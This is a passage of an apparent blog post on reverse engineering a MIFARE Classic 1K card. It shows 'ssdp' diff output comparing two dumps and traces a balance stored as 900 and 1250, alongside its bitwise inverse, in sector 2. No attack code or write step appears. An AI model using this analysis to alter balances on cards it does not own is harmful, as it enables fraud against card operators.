+<p>This is the point where the problem becomes relational. A value does not mean much in isolation; it starts to mean something when it changes, or when it is contrasted with another value. Bateson’s definition of information as <a href="https://www.goodreads.com/quotes/517599-information-is-a-difference-that-makes-a-difference">“a difference that makes a difference”</a> fits perfectly here: one dump is just noise, but two dumps, with one known thing changed, start to point at structure.</p>
+
+<p>I used <a href="https://github.com/fedemengo/ssdp"><code class="language-plaintext highlighter-rouge">ssdp</code></a>, a small helper tool I wrote, to diff the binary dumps. The diff groups each 16-byte block into units. With <code class="language-plaintext highlighter-rouge">--units 1</code>, every single byte is its own unit, so the output can point to the exact changed byte instead of a larger 2-, 4-, or 8-byte chunk. That makes the output look like a block view with per-byte offsets, so a change at <code class="language-plaintext highlighter-rouge">+05</code> means byte <code class="language-plaintext highlighter-rouge">5</code> inside that block was modified.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> ssdp diff <span class="nt">--units</span> 1 <span class="nt">--format</span> mf1k hf-mf-6C2FAC83-dump-0900.bin hf-mf-6C2FAC83-dump-1250.bin | <span class="nb">cat
+</span>Inputs:
+  data01: hf-mf-6C2FAC83-dump-0900.bin
+  data02: hf-mf-6C2FAC83-dump-1250.bin
+
+Diff blocks:
+  <span class="o">[</span>BLOCK] <span class="nv">ID</span><span class="o">=</span>6 <span class="nv">S</span><span class="o">=</span>1 <span class="nv">B</span><span class="o">=</span>2
+  <span class="o">[</span>BLOCK] <span class="nv">ID</span><span class="o">=</span>8 <span class="nv">S</span><span class="o">=</span>2 <span class="nv">B</span><span class="o">=</span>0
+  <span class="o">[</span>BLOCK] <span class="nv">ID</span><span class="o">=</span>9 <span class="nv">S</span><span class="o">=</span>2 <span class="nv">B</span><span class="o">=</span>1
+
+<span class="o">[</span>BLOCK] <span class="nv">ID</span><span class="o">=</span>6 <span class="nv">S</span><span class="o">=</span>1 <span class="nv">B</span><span class="o">=</span>2
+  <span class="o">[</span><span class="nv">units</span><span class="o">=</span>1]
+    data01: <span class="nv">FULL</span><span class="o">=[</span>92] | <span class="o">[</span>B3] | <span class="o">[</span>D9] | 34 | 00 | 00 | 00 | 00 | 00 | 00 | 00 | 00 | <span class="o">[</span>FB] | 01 | 00 | <span class="o">[</span>16]
+    data02: <span class="nv">FULL</span><span class="o">=[</span>C5] | <span class="o">[</span>59] | <span class="o">[</span>C6] | 34 | 00 | 00 | 00 | 00 | 00 | 00 | 00 | 00 | <span class="o">[</span>F9] | 01 | 00 | <span class="o">[</span>04]
+    <span class="o">!</span>+00
+      data01: <span class="nv">RAW</span><span class="o">=</span>92 | <span class="nv">INT_LE</span><span class="o">=</span>       146 | <span class="nv">INT_BE</span><span class="o">=</span>       146 | <span class="nv">NOT_LE</span><span class="o">=</span>       109 | <span class="nv">NOT_BE</span><span class="o">=</span>       109 | <span class="nv">BIN</span><span class="o">=</span>10010010 | <span class="nv">BIN_NOT</span><span class="o">=</span>01101101 | <span class="nv">NOT_RAW</span><span class="o">=</span>6D
+      data02: <span class="nv">RAW</span><span class="o">=</span>C5 | <span class="nv">INT_LE</span><span class="o">=</span>       197 | <span class="nv">INT_BE</span><span class="o">=</span>       197 | <span class="nv">NOT_LE</span><span class="o">=</span>        58 | <span class="nv">NOT_BE</span><span class="o">=</span>        58 | <span class="nv">BIN</span><span class="o">=</span>11000101 | <span class="nv">BIN_NOT</span><span class="o">=</span>00111010 | <span class="nv">NOT_RAW</span><span class="o">=</span>3A
+    <span class="o">!</span>+01
+      data01: <span class="nv">RAW</span><span class="o">=</span>B3 | <span class="nv">INT_LE</span><span class="o">=</span>       179 | <span class="nv">INT_BE</span><span class="o">=</span>       179 | <span class="nv">NOT_LE</span><span class="o">=</span>        76 | <span class="nv">NOT_BE</span><span class="o">=</span>        76 | <span class="nv">BIN</span><span class="o">=</span>10110011 | <span class="nv">BIN_NOT</span><span class="o">=</span>01001100 | <span class="nv">NOT_RAW</span><span class="o">=</span>4C
+      data02: <span class="nv">RAW</span><span class="o">=</span>59 | <span class="nv">INT_LE</span><span class="o">=</span>        89 | <span class="nv">INT_BE</span><span class="o">=</span>        89 | <span class="nv">NOT_LE</span><span class="o">=</span>       166 | <span class="nv">NOT_BE</span><span class="o">=</span>       166 | <span class="nv">BIN</span><span class="o">=</span>01011001 | <span class="nv">BIN_NOT</span><span class="o">=</span>10100110 | <span class="nv">NOT_RAW</span><span class="o">=</span>A6
+    <span class="o">!</span>+02
+      data01: <span class="nv">RAW</span><span class="o">=</span>D9 | <span class="nv">INT_LE</span><span class="o">=</span>       217 | <span class="nv">INT_BE</span><span class="o">=</span>       217 | <span class="nv">NOT_LE</span><span class="o">=</span>        38 | <span class="nv">NOT_BE</span><span class="o">=</span>        38 | <span class="nv">BIN</span><span class="o">=</span>11011001 | <span class="nv">BIN_NOT</span><span class="o">=</span>00100110 | <span class="nv">NOT_RAW</span><span class="o">=</span>26
+      data02: <span class="nv">RAW</span><span class="o">=</span>C6 | <span class="nv">INT_LE</span><span class="o">=</span>       198 | <span class="nv">INT_BE</span><span class="o">=</span>       198 | <span class="nv">NOT_LE</span><span class="o">=</span>        57 | <span class="nv">NOT_BE</span><span class="o">=</span>        57 | <span class="nv">BIN</span><span class="o">=</span>11000110 | <span class="nv">BIN_NOT</span><span class="o">=</span>00111001 | <span class="nv">NOT_RAW</span><span class="o">=</span>39
+    <span class="o">!</span>+12
+      data01: <span class="nv">RAW</span><span class="o">=</span>FB | <span class="nv">INT_LE</span><span class="o">=</span>       251 | <span class="nv">INT_BE</span><span class="o">=</span>       251 | <span class="nv">NOT_LE</span><span class="o">=</span>         4 | <span class="nv">NOT_BE</span><span class="o">=</span>         4 | <span class="nv">BIN</span><span class="o">=</span>11111011 | <span class="nv">BIN_NOT</span><span class="o">=</span>00000100 | <span class="nv">NOT_RAW</span><span class="o">=</span>04
+      data02: <span class="nv">RAW</span><span class="o">=</span>F9 | <span class="nv">INT_LE</span><span class="o">=</span>       249 | <span class="nv">INT_BE</span><span class="o">=</span>       249 | <span class="nv">NOT_LE</span><span class="o">=</span>         6 | <span class="nv">NOT_BE</span><span class="o">=</span>         6 | <span class="nv">BIN</span><span class="o">=</span>11111001 | <span class="nv">BIN_NOT</span><span class="o">=</span>00000110 | <span class="nv">NOT_RAW</span><span class="o">=</span>06
+    <span class="o">!</span>+15
+      data01: <span class="nv">RAW</span><span class="o">=</span>16 | <span class="nv">INT_LE</span><span class="o">=</span>        22 | <span class="nv">INT_BE</span><span class="o">=</span>        22 | <span class="nv">NOT_LE</span><span class="o">=</span>       233 | <span class="nv">NOT_BE</span><span class="o">=</span>       233 | <span class="nv">BIN</span><span class="o">=</span>00010110 | <span class="nv">BIN_NOT</span><span class="o">=</span>11101001 | <span class="nv">NOT_RAW</span><span class="o">=</span>E9
+      data02: <span class="nv">RAW</span><span class="o">=</span>04 | <span class="nv">INT_LE</span><span class="o">=</span>         4 | <span class="nv">INT_BE</span><span class="o">=</span>         4 | <span class="nv">NOT_LE</span><span class="o">=</span>       251 | <span class="nv">NOT_BE</span><span class="o">=</span>       251 | <span class="nv">BIN</span><span class="o">=</span>00000100 | <span class="nv">BIN_NOT</span><span class="o">=</span>11111011 | <span class="nv">NOT_RAW</span><span class="o">=</span>FB
+
+<span class="o">[</span>BLOCK] <span class="nv">ID</span><span class="o">=</span>8 <span class="nv">S</span><span class="o">=</span>2 <span class="nv">B</span><span class="o">=</span>0
+  <span class="o">[</span><span class="nv">units</span><span class="o">=</span>1]
+    data01: <span class="nv">FULL</span><span class="o">=[</span>84] | <span class="o">[</span>03] | 00 | 00 | <span class="o">[</span>7B] | <span class="o">[</span>FC] | FF | FF | <span class="o">[</span>84] | <span class="o">[</span>03] | 00 | 00 | 09 | F6 | 09 | F6
+    data02: <span class="nv">FULL</span><span class="o">=[</span>E2] | <span class="o">[</span>04] | 00 | 00 | <span class="o">[</span>1D] | <span class="o">[</span>FB] | FF | FF | <span class="o">[</span>E2] | <span class="o">[</span>04] | 00 | 00 | 09 | F6 | 09 | F6
+    <span class="o">!</span>+00
+      data01: <span class="nv">RAW</span><span class="o">=</span>84 | <span class="nv">INT_LE</span><span class="o">=</span>       132 | <span class="nv">INT_BE</span><span class="o">=</span>       132 | <span class="nv">NOT_LE</span><span class="o">=</span>       123 | <span class="nv">NOT_BE</span><span class="o">=</span>       123 | <span class="nv">BIN</span><span class="o">=</span>10000100 | <span class="nv">BIN_NOT</span><span class="o">=</span>01111011 | <span class="nv">NOT_RAW</span><span class="o">=</span>7B
+      data02: <span class="nv">RAW</span><span class="o">=</span>E2 | <span class="nv">INT_LE</span><span class="o">=</span>       226 | <span class="nv">INT_BE</span><span class="o">=</span>       226 | <span class="nv">NOT_LE</span><span class="o">=</span>        29 | <span class="nv">NOT_BE</span><span class="o">=</span>        29 | <span class="nv">BIN</span><span class="o">=</span>11100010 | <span class="nv">BIN_NOT</span><span class="o">=</span>00011101 | <span class="nv">NOT_RAW</span><span class="o">=</span>1D
+    <span class="o">!</span>+01
+      data01: <span class="nv">RAW</span><span class="o">=</span>03 | <span class="nv">INT_LE</span><span class="o">=</span>         3 | <span class="nv">INT_BE</span><span class="o">=</span>         3 | <span class="nv">NOT_LE</span><span class="o">=</span>       252 | <span class="nv">NOT_BE</span><span class="o">=</span>       252 | <span class="nv">BIN</span><span class="o">=</span>00000011 | <span class="nv">BIN_NOT</span><span class="o">=</span>11111100 | <span class="nv">NOT_RAW</span><span class="o">=</span>FC
+      data02: <span class="nv">RAW</span><span class="o">=</span>04 | <span class="nv">INT_LE</span><span class="o">=</span>         4 | <span class="nv">INT_BE</span><span class="o">=</span>         4 | <span class="nv">NOT_LE</span><span class="o">=</span>       251 | <span class="nv">NOT_BE</span><span class="o">=</span>       251 | <span class="nv">BIN</span><span class="o">=</span>00000100 | <span class="nv">BIN_NOT</span><span class="o">=</span>11111011 | <span class="nv">NOT_RAW</span><span class="o">=</span>FB
+    <span class="o">!</span>+04
+      data01: <span class="nv">RAW</span><span class="o">=</span>7B | <span class="nv">INT_LE</span><span class="o">=</span>       123 | <span class="nv">INT_BE</span><span class="o">=</span>       123 | <span class="nv">NOT_LE</span><span class="o">=</span>       132 | <span class="nv">NOT_BE</span><span class="o">=</span>       132 | <span class="nv">BIN</span><span class="o">=</span>01111011 | <span class="nv">BIN_NOT</span><span class="o">=</span>10000100 | <span class="nv">NOT_RAW</span><span class="o">=</span>84
+      data02: <span class="nv">RAW</span><span class="o">=</span>1D | <span class="nv">INT_LE</span><span class="o">=</span>        29 | <span class="nv">INT_BE</span><span class="o">=</span>        29 | <span class="nv">NOT_LE</span><span class="o">=</span>       226 | <span class="nv">NOT_BE</span><span class="o">=</span>       226 | <span class="nv">BIN</span><span class="o">=</span>00011101 | <span class="nv">BIN_NOT</span><span class="o">=</span>11100010 | <span class="nv">NOT_RAW</span><span class="o">=</span>E2
+    <span class="o">!</span>+05
+      data01: <span class="nv">RAW</span><span class="o">=</span>FC | <span class="nv">INT_LE</span><span class="o">=</span>       252 | <span class="nv">INT_BE</span><span class="o">=</span>       252 | <span class="nv">NOT_LE</span><span class="o">=</span>         3 | <span class="nv">NOT_BE</span><span class="o">=</span>         3 | <span class="nv">BIN</span><span class="o">=</span>11111100 | <span class="nv">BIN_NOT</span><span class="o">=</span>00000011 | <span class="nv">NOT_RAW</span><span class="o">=</span>03
+      data02: <span class="nv">RAW</span><span class="o">=</span>FB | <span class="nv">INT_LE</span><span class="o">=</span>       251 | <span class="nv">INT_BE</span><span class="o">=</span>       251 | <span class="nv">NOT_LE</span><span class="o">=</span>         4 | <span class="nv">NOT_BE</span><span class="o">=</span>         4 | <span class="nv">BIN</span><span class="o">=</span>11111011 | <span class="nv">BIN_NOT</span><span class="o">=</span>00000100 | <span class="nv">NOT_RAW</span><span class="o">=</span>04
+    <span class="o">!</span>+08
+      data01: <span class="nv">RAW</span><span class="o">=</span>84 | <span class="nv">INT_LE</span><span class="o">=</span>       132 | <span class="nv">INT_BE</span><span class="o">=</span>       132 | <span class="nv">NOT_LE</span><span class="o">=</span>       123 | <span class="nv">NOT_BE</span><span class="o">=</span>       123 | <span class="nv">BIN</span><span class="o">=</span>10000100 | <span class="nv">BIN_NOT</span><span class="o">=</span>01111011 | <span class="nv">NOT_RAW</span><span class="o">=</span>7B
+      data02: <span class="nv">RAW</span><span class="o">=</span>E2 | <span class="nv">INT_LE</span><span class="o">=</span>       226 | <span class="nv">INT_BE</span><span class="o">=</span>       226 | <span class="nv">NOT_LE</span><span class="o">=</span>        29 | <span class="nv">NOT_BE</span><span class="o">=</span>        29 | <span class="nv">BIN</span><span class="o">=</span>11100010 | <span class="nv">BIN_NOT</span><span class="o">=</span>00011101 | <span class="nv">NOT_RAW</span><span class="o">=</span>1D
+    <span class="o">!</span>+09
+      data01: <span class="nv">RAW</span><span class="o">=</span>03 | <span class="nv">INT_LE</span><span class="o">=</span>         3 | <span class="nv">INT_BE</span><span class="o">=</span>         3 | <span class="nv">NOT_LE</span><span class="o">=</span>       252 | <span class="nv">NOT_BE</span><span class="o">=</span>       252 | <span class="nv">BIN</span><span class="o">=</span>00000011 | <span class="nv">BIN_NOT</span><span class="o">=</span>11111100 | <span class="nv">NOT_RAW</span><span class="o">=</span>FC
+      data02: <span class="nv">RAW</span><span class="o">=</span>04 | <span class="nv">INT_LE</span><span class="o">=</span>         4 | <span class="nv">INT_BE</span><span class="o">=</span>         4 | <span class="nv">NOT_LE</span><span class="o">=</span>       251 | <span class="nv">NOT_BE</span><span class="o">=</span>       251 | <span class="nv">BIN</span><span class="o">=</span>00000100 | <span class="nv">BIN_NOT</span><span class="o">=</span>11111011 | <span class="nv">NOT_RAW</span><span class="o">=</span>FB
+
+<span class="o">[</span>BLOCK] <span class="nv">ID</span><span class="o">=</span>9 <span class="nv">S</span><span class="o">=</span>2 <span class="nv">B</span><span class="o">=</span>1
+  <span class="o">[</span><span class="nv">units</span><span class="o">=</span>1]
+    data01: <span class="nv">FULL</span><span class="o">=[</span>84] | <span class="o">[</span>03] | 00 | 00 | <span class="o">[</span>7B] | <span class="o">[</span>FC] | FF | FF | <span class="o">[</span>84] | <span class="o">[</span>03] | 00 | 00 | 09 | F6 | 09 | F6
+    data02: <span class="nv">FULL</span><span class="o">=[</span>E2] | <span class="o">[</span>04] | 00 | 00 | <span class="o">[</span>1D] | <span class="o">[</span>FB] | FF | FF | <span class="o">[</span>E2] | <span class="o">[</span>04] | 00 | 00 | 09 | F6 | 09 | F6
+    <span class="o">!</span>+00
+      data01: <span class="nv">RAW</span><span class="o">=</span>84 | <span class="nv">INT_LE</span><span class="o">=</span>       132 | <span class="nv">INT_BE</span><span class="o">=</span>       132 | <span class="nv">NOT_LE</span><span class="o">=</span>       123 | <span class="nv">NOT_BE</span><span class="o">=</span>       123 | <span class="nv">BIN</span><span class="o">=</span>10000100 | <span class="nv">BIN_NOT</span><span class="o">=</span>01111011 | <span class="nv">NOT_RAW</span><span class="o">=</span>7B
+      data02: <span class="nv">RAW</span><span class="o">=</span>E2 | <span class="nv">INT_LE</span><span class="o">=</span>       226 | <span class="nv">INT_BE</span><span class="o">=</span>       226 | <span class="nv">NOT_LE</span><span class="o">=</span>        29 | <span class="nv">NOT_BE</span><span class="o">=</span>        29 | <span class="nv">BIN</span><span class="o">=</span>11100010 | <span class="nv">BIN_NOT</span><span class="o">=</span>00011101 | <span class="nv">NOT_RAW</span><span class="o">=</span>1D
+    <span class="o">!</span>+01
+      data01: <span class="nv">RAW</span><span class="o">=</span>03 | <span class="nv">INT_LE</span><span class="o">=</span>         3 | <span class="nv">INT_BE</span><span class="o">=</span>         3 | <span class="nv">NOT_LE</span><span class="o">=</span>       252 | <span class="nv">NOT_BE</span><span class="o">=</span>       252 | <span class="nv">BIN</span><span class="o">=</span>00000011 | <span class="nv">BIN_NOT</span><span class="o">=</span>11111100 | <span class="nv">NOT_RAW</span><span class="o">=</span>FC
+      data02: <span class="nv">RAW</span><span class="o">=</span>04 | <span class="nv">INT_LE</span><span class="o">=</span>         4 | <span class="nv">INT_BE</span><span class="o">=</span>         4 | <span class="nv">NOT_LE</span><span class="o">=</span>       251 | <span class="nv">NOT_BE</span><span class="o">=</span>       251 | <span class="nv">BIN</span><span class="o">=</span>00000100 | <span class="nv">BIN_NOT</span><span class="o">=</span>11111011 | <span class="nv">NOT_RAW</span><span class="o">=</span>FB
+    <span class="o">!</span>+04
+      data01: <span class="nv">RAW</span><span class="o">=</span>7B | <span class="nv">INT_LE</span><span class="o">=</span>       123 | <span class="nv">INT_BE</span><span class="o">=</span>       123 | <span class="nv">NOT_LE</span><span class="o">=</span>       132 | <span class="nv">NOT_BE</span><span class="o">=</span>       132 | <span class="nv">BIN</span><span class="o">=</span>01111011 | <span class="nv">BIN_NOT</span><span class="o">=</span>10000100 | <span class="nv">NOT_RAW</span><span class="o">=</span>84
+      data02: <span class="nv">RAW</span><span class="o">=</span>1D | <span class="nv">INT_LE</span><span class="o">=</span>        29 | <span class="nv">INT_BE</span><span class="o">=</span>        29 | <span class="nv">NOT_LE</span><span class="o">=</span>       226 | <span class="nv">NOT_BE</span><span class="o">=</span>       226 | <span class="nv">BIN</span><span class="o">=</span>00011101 | <span class="nv">BIN_NOT</span><span class="o">=</span>11100010 | <span class="nv">NOT_RAW</span><span class="o">=</span>E2
+    <span class="o">!</span>+05
+      data01: <span class="nv">RAW</span><span class="o">=</span>FC | <span class="nv">INT_LE</span><span class="o">=</span>       252 | <span class="nv">INT_BE</span><span class="o">=</span>       252 | <span class="nv">NOT_LE</span><span class="o">=</span>         3 | <span class="nv">NOT_BE</span><span class="o">=</span>         3 | <span class="nv">BIN</span><span class="o">=</span>11111100 | <span class="nv">BIN_NOT</span><span class="o">=</span>00000011 | <span class="nv">NOT_RAW</span><span class="o">=</span>03
+      data02: <span class="nv">RAW</span><span class="o">=</span>FB | <span class="nv">INT_LE</span><span class="o">=</span>       251 | <span class="nv">INT_BE</span><span class="o">=</span>       251 | <span class="nv">NOT_LE</span><span class="o">=</span>         4 | <span class="nv">NOT_BE</span><span class="o">=</span>         4 | <span class="nv">BIN</span><span class="o">=</span>11111011 | <span class="nv">BIN_NOT</span><span class="o">=</span>00000100 | <span class="nv">NOT_RAW</span><span class="o">=</span>04
+    <span class="o">!</span>+08
+      data01: <span class="nv">RAW</span><span class="o">=</span>84 | <span class="nv">INT_LE</span><span class="o">=</span>       132 | <span class="nv">INT_BE</span><span class="o">=</span>       132 | <span class="nv">NOT_LE</span><span class="o">=</span>       123 | <span class="nv">NOT_BE</span><span class="o">=</span>       123 | <span class="nv">BIN</span><span class="o">=</span>10000100 | <span class="nv">BIN_NOT</span><span class="o">=</span>01111011 | <span class="nv">NOT_RAW</span><span class="o">=</span>7B
+      data02: <span class="nv">RAW</span><span class="o">=</span>E2 | <span class="nv">INT_LE</span><span class="o">=</span>       226 | <span class="nv">INT_BE</span><span class="o">=</span>       226 | <span class="nv">NOT_LE</span><span class="o">=</span>        29 | <span class="nv">NOT_BE</span><span class="o">=</span>        29 | <span class="nv">BIN</span><span class="o">=</span>11100010 | <span class="nv">BIN_NOT</span><span class="o">=</span>00011101 | <span class="nv">NOT_RAW</span><span class="o">=</span>1D
+    <span class="o">!</span>+09
+      data01: <span class="nv">RAW</span><span class="o">=</span>03 | <span class="nv">INT_LE</span><span class="o">=</span>         3 | <span class="nv">INT_BE</span><span class="o">=</span>         3 | <span class="nv">NOT_LE</span><span class="o">=</span>       252 | <span class="nv">NOT_BE</span><span class="o">=</span>       252 | <span class="nv">BIN</span><span class="o">=</span>00000011 | <span class="nv">BIN_NOT</span><span class="o">=</span>11111100 | <span class="nv">NOT_RAW</span><span class="o">=</span>FC
+      data02: <span class="nv">RAW</span><span class="o">=</span>04 | <span class="nv">INT_LE</span><span class="o">=</span>         4 | <span class="nv">INT_BE</span><span class="o">=</span>         4 | <span class="nv">NOT_LE</span><span class="o">=</span>       251 | <span class="nv">NOT_BE</span><span class="o">=</span>       251 | <span class="nv">BIN</span><span class="o">=</span>00000100 | <span class="nv">BIN_NOT</span><span class="o">=</span>11111011 | <span class="nv">NOT_RAW</span><span class="o">=</span>FB
+
+</code></pre></div></div>
+
+<p>This is useful, but it is also noisy. The interesting changes tend to come in adjacent byte pairs, so it makes sense to run the same comparison again with <code class="language-plaintext highlighter-rouge">--units 2</code>. That gives a better view of 16-bit values, which is exactly the kind of encoding I would expect for a small balance.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> ssdp diff <span class="nt">--units</span> 2 <span class="nt">--format</span> mf1k hf-mf-6C2FAC83-dump-0900.bin hf-mf-6C2FAC83-dump-1250.bin | <span class="nb">cat
+</span>Inputs:
+  data01: hf-mf-6C2FAC83-dump-0900.bin
+  data02: hf-mf-6C2FAC83-dump-1250.bin
+
+Diff blocks:
+  <span class="o">[</span>BLOCK] <span class="nv">ID</span><span class="o">=</span>6 <span class="nv">S</span><span class="o">=</span>1 <span class="nv">B</span><span class="o">=</span>2
+  <span class="o">[</span>BLOCK] <span class="nv">ID</span><span class="o">=</span>8 <span class="nv">S</span><span class="o">=</span>2 <span class="nv">B</span><span class="o">=</span>0
+  <span class="o">[</span>BLOCK] <span class="nv">ID</span><span class="o">=</span>9 <span class="nv">S</span><span class="o">=</span>2 <span class="nv">B</span><span class="o">=</span>1
+
+<span class="o">[</span>BLOCK] <span class="nv">ID</span><span class="o">=</span>6 <span class="nv">S</span><span class="o">=</span>1 <span class="nv">B</span><span class="o">=</span>2
+  <span class="o">[</span><span class="nv">units</span><span class="o">=</span>2]
+    data01: <span class="nv">FULL</span><span class="o">=[</span>92 B3] | <span class="o">[</span>D9 34] | 00 00 | 00 00 | 00 00 | 00 00 | <span class="o">[</span>FB 01] | <span class="o">[</span>00 16]
+    data02: <span class="nv">FULL</span><span class="o">=[</span>C5 59] | <span class="o">[</span>C6 34] | 00 00 | 00 00 | 00 00 | 00 00 | <span class="o">[</span>F9 01] | <span class="o">[</span>00 04]
+    <span class="o">!</span>+00
+      data01: <span class="nv">RAW</span><span class="o">=</span>92 B3 | <span class="nv">INT_LE</span><span class="o">=</span>     45970 | <span class="nv">INT_BE</span><span class="o">=</span>     37555 | <span class="nv">NOT_LE</span><span class="o">=</span>     19565 | <span class="nv">NOT_BE</span><span class="o">=</span>     27980 | <span class="nv">BIN</span><span class="o">=</span>1011001110010010 | <span class="nv">BIN_NOT</span><span class="o">=</span>0100110001101101 | <span class="nv">NOT_RAW</span><span class="o">=</span>6D 4C
+      data02: <span class="nv">RAW</span><span class="o">=</span>C5 59 | <span class="nv">INT_LE</span><span class="o">=</span>     22981 | <span class="nv">INT_BE</span><span class="o">=</span>     50521 | <span class="nv">NOT_LE</span><span class="o">=</span>     42554 | <span class="nv">NOT_BE</span><span class="o">=</span>     15014 | <span class="nv">BIN</span><span class="o">=</span>0101100111000101 | <span class="nv">BIN_NOT</span><span class="o">=</span>1010011000111010 | <span class="nv">NOT_RAW</span><span class="o">=</span>3A A6
+    <span class="o">!</span>+02
+      data01: <span class="nv">RAW</span><span class="o">=</span>D9 34 | <span class="nv">INT_LE</span><span class="o">=</span>     13529 | <span class="nv">INT_BE</span><span class="o">=</span>     55604 | <span class="nv">NOT_LE</span><span class="o">=</span>     52006 | <span class="nv">NOT_BE</span><span class="o">=</span>      9931 | <span class="nv">BIN</span><span class="o">=</span>0011010011011001 | <span class="nv">BIN_NOT</span><span class="o">=</span>1100101100100110 | <span class="nv">NOT_RAW</span><span class="o">=</span>26 CB
+      data02: <span class="nv">RAW</span><span class="o">=</span>C6 34 | <span class="nv">INT_LE</span><span class="o">=</span>     13510 | <span class="nv">INT_BE</span><span class="o">=</span>     50740 | <span class="nv">NOT_LE</span><span class="o">=</span>     52025 | <span class="nv">NOT_BE</span><span class="o">=</span>     14795 | <span class="nv">BIN</span><span class="o">=</span>0011010011000110 | <span class="nv">BIN_NOT</span><span class="o">=</span>1100101100111001 | <span class="nv">NOT_RAW</span><span class="o">=</span>39 CB
+    <span class="o">!</span>+12
+      data01: <span class="nv">RAW</span><span class="o">=</span>FB 01 | <span class="nv">INT_LE</span><span class="o">=</span>       507 | <span class="nv">INT_BE</span><span class="o">=</span>     64257 | <span class="nv">NOT_LE</span><span class="o">=</span>     65028 | <span class="nv">NOT_BE</span><span class="o">=</span>      1278 | <span class="nv">BIN</span><span class="o">=</span>0000000111111011 | <span class="nv">BIN_NOT</span><span class="o">=</span>1111111000000100 | <span class="nv">NOT_RAW</span><span class="o">=</span>04 FE
+      data02: <span class="nv">RAW</span><span class="o">=</span>F9 01 | <span class="nv">INT_LE</span><span class="o">=</span>       505 | <span class="nv">INT_BE</span><span class="o">=</span>     63745 | <span class="nv">NOT_LE</span><span class="o">=</span>     65030 | <span class="nv">NOT_BE</span><span class="o">=</span>      1790 | <span class="nv">BIN</span><span class="o">=</span>0000000111111001 | <span class="nv">BIN_NOT</span><span class="o">=</span>1111111000000110 | <span class="nv">NOT_RAW</span><span class="o">=</span>06 FE
+    <span class="o">!</span>+14
+      data01: <span class="nv">RAW</span><span class="o">=</span>00 16 | <span class="nv">INT_LE</span><span class="o">=</span>      5632 | <span class="nv">INT_BE</span><span class="o">=</span>        22 | <span class="nv">NOT_LE</span><span class="o">=</span>     59903 | <span class="nv">NOT_BE</span><span class="o">=</span>     65513 | <span class="nv">BIN</span><span class="o">=</span>0001011000000000 | <span class="nv">BIN_NOT</span><span class="o">=</span>1110100111111111 | <span class="nv">NOT_RAW</span><span class="o">=</span>FF E9
+      data02: <span class="nv">RAW</span><span class="o">=</span>00 04 | <span class="nv">INT_LE</span><span class="o">=</span>      1024 | <span class="nv">INT_BE</span><span class="o">=</span>         4 | <span class="nv">NOT_LE</span><span class="o">=</span>     64511 | <span class="nv">NOT_BE</span><span class="o">=</span>     65531 | <span class="nv">BIN</span><span class="o">=</span>0000010000000000 | <span class="nv">BIN_NOT</span><span class="o">=</span>1111101111111111 | <span class="nv">NOT_RAW</span><span class="o">=</span>FF FB
+
+<span class="o">[</span>BLOCK] <span class="nv">ID</span><span class="o">=</span>8 <span class="nv">S</span><span class="o">=</span>2 <span class="nv">B</span><span class="o">=</span>0
+  <span class="o">[</span><span class="nv">units</span><span class="o">=</span>2]
+    data01: <span class="nv">FULL</span><span class="o">=[</span>84 03] | 00 00 | <span class="o">[</span>7B FC] | FF FF | <span class="o">[</span>84 03] | 00 00 | 09 F6 | 09 F6
+    data02: <span class="nv">FULL</span><span class="o">=[</span>E2 04] | 00 00 | <span class="o">[</span>1D FB] | FF FF | <span class="o">[</span>E2 04] | 00 00 | 09 F6 | 09 F6
+    <span class="o">!</span>+00
+      data01: <span class="nv">RAW</span><span class="o">=</span>84 03 | <span class="nv">INT_LE</span><span class="o">=</span>       900 | <span class="nv">INT_BE</span><span class="o">=</span>     33795 | <span class="nv">NOT_LE</span><span class="o">=</span>     64635 | <span class="nv">NOT_BE</span><span class="o">=</span>     31740 | <span class="nv">BIN</span><span class="o">=</span>0000001110000100 | <span class="nv">BIN_NOT</span><span class="o">=</span>1111110001111011 | <span class="nv">NOT_RAW</span><span class="o">=</span>7B FC
+      data02: <span class="nv">RAW</span><span class="o">=</span>E2 04 | <span class="nv">INT_LE</span><span class="o">=</span>      1250 | <span class="nv">INT_BE</span><span class="o">=</span>     57860 | <span class="nv">NOT_LE</span><span class="o">=</span>     64285 | <span class="nv">NOT_BE</span><span class="o">=</span>      7675 | <span class="nv">BIN</span><span class="o">=</span>0000010011100010 | <span class="nv">BIN_NOT</span><span class="o">=</span>1111101100011101 | <span class="nv">NOT_RAW</span><span class="o">=</span>1D FB
+    <span class="o">!</span>+04
+      data01: <span class="nv">RAW</span><span class="o">=</span>7B FC | <span class="nv">INT_LE</span><span class="o">=</span>     64635 | <span class="nv">INT_BE</span><span class="o">=</span>     31740 | <span class="nv">NOT_LE</span><span class="o">=</span>       900 | <span class="nv">NOT_BE</span><span class="o">=</span>     33795 | <span class="nv">BIN</span><span class="o">=</span>1111110001111011 | <span class="nv">BIN_NOT</span><span class="o">=</span>0000001110000100 | <span class="nv">NOT_RAW</span><span class="o">=</span>84 03
+      data02: <span class="nv">RAW</span><span class="o">=</span>1D FB | <span class="nv">INT_LE</span><span class="o">=</span>     64285 | <span class="nv">INT_BE</span><span class="o">=</span>      7675 | <span class="nv">NOT_LE</span><span class="o">=</span>      1250 | <span class="nv">NOT_BE</span><span class="o">=</span>     57860 | <span class="nv">BIN</span><span class="o">=</span>1111101100011101 | <span class="nv">BIN_NOT</span><span class="o">=</span>0000010011100010 | <span class="nv">NOT_RAW</span><span class="o">=</span>E2 04
+    <span class="o">!</span>+08
+      data01: <span class="nv">RAW</span><span class="o">=</span>84 03 | <span class="nv">INT_LE</span><span class="o">=</span>       900 | <span class="nv">INT_BE</span><span class="o">=</span>     33795 | <span class="nv">NOT_LE</span><span class="o">=</span>     64635 | <span class="nv">NOT_BE</span><span class="o">=</span>     31740 | <span class="nv">BIN</span><span class="o">=</span>0000001110000100 | <span class="nv">BIN_NOT</span><span class="o">=</span>1111110001111011 | <span class="nv">NOT_RAW</span><span class="o">=</span>7B FC
+      data02: <span class="nv">RAW</span><span class="o">=</span>E2 04 | <span class="nv">INT_LE</span><span class="o">=</span>      1250 | <span class="nv">INT_BE</span><span class="o">=</span>     57860 | <span class="nv">NOT_LE</span><span class="o">=</span>     64285 | <span class="nv">NOT_BE</span><span class="o">=</span>      7675 | <span class="nv">BIN</span><span class="o">=</span>0000010011100010 | <span class="nv">BIN_NOT</span><span class="o">=</span>1111101100011101 | <span class="nv">NOT_RAW</span><span class="o">=</span>1D FB
+
